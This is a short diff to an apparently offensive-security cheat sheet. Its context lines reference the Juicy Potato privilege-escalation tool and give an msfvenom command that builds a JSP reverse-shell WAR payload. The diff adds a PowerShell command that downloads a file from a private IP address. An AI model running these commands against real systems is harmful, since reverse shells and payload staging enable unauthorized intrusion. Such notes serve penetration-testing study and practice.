@@ -319,3 +319,7 @@ Use: https://github.com/ohpe/juicy-potato
 
 ### WAR
 ##### msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f war > shell.war
+
+
+
+powershell -command "& { iwr http://192.168.199.1/win.txt -OutFile win.txt }"
